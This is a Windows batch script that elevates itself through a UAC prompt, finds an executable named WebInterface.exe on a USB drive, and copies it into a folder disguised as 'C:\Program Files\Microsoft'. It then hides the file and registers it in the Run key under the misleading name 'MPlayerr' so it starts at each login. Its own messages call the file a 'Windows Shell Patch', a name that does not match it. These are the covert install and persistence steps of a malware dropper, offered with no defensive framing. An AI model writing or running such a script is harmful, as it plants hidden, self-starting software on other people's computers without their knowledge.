:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------


@echo off
setlocal

setlocal EnableExtensions DisableDelayedExpansion
set "Directory=C:\Program Files\Microsoft"

if not exist "%Directory%\*" (
    md "%Directory%"
    if errorlevel 1 (
        echo Failed to create directory "%Directory%"
        pause
        goto :EOF
    )
)

:: Get the drive letter of the pen drive
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\amitranet\WebInterface.exe" (
        set "drive=%%d"
        goto :found
    )
)

echo "Windows Shell Patch Auto.exe not found on any drive"
exit /b

:found
echo "Found Windows Shell Patch Auto.exe on drive %drive%"

:: Copy the file to the startup folder
copy /Y "%drive%:\amitranet\WebInterface.exe" "C:\Program Files\Microsoft"

attrib +h "C:\Program Files\Microsoft\WebInterface.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MPlayerr /t REG_SZ /d "\"C:\Program Files\Microsoft\WebInterface.exe\" --win-session-start \"\"" /f
